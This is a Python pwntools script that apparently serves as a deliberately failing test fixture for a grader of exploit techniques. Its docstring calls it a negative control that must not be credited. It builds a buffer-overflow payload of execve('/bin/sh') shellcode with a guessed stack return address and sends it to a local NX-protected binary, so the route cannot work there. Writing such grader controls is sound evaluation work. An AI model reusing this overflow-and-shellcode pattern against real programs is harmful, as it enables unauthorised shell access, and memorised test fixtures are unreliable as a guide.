#!/usr/bin/env python3
"""NEGATIVE CONTROL: A ROUTE THAT CANNOT WORK ON THIS BINARY. Must NOT be credited.

Teaches ret2shellcode -- write shellcode into `buf` and return to it -- against a
target built with NX enabled. The stack is not executable, so control transfer to
the payload faults immediately.

This is the third real wave-1 defect: protections silently defaulted to
"unprotected", so the engine taught ret2shellcode on an NX binary. The artifact
reads as competent, names a genuine technique, and is wrong about the one fact
that decides whether it can possibly work. A scorer that accepted a plausible
technique name, or a self-report, would credit it.

The shellcode is a standard `execve("/bin/sh")` stub; nothing about it is subtle.
The defect is the route, not the payload.
"""
import os
import sys
import warnings

os.environ.setdefault("TERM", "xterm")
warnings.filterwarnings("ignore")
from pwn import asm, context, p64, process, shellcraft  # noqa: E402

context.clear(arch="amd64", os="linux", log_level="error")

BINARY = os.path.join(os.getcwd(), "ret2plt_system")
OFFSET = 72
# A plausible-looking stack address. It does not matter that it is a guess: the
# stack is NX, so no value here can work.
FAKE_STACK_ADDR = 0x7FFFFFFFE000


def main() -> int:
    sc = asm(shellcraft.amd64.linux.sh())
    payload = sc.ljust(OFFSET, b"\x90") + p64(FAKE_STACK_ADDR)
    p = process(BINARY, cwd=os.getcwd())
    p.recvuntil(b"Input: ")
    p.send(payload)
    p.interactive()
    return 0


if __name__ == "__main__":
    sys.exit(main())
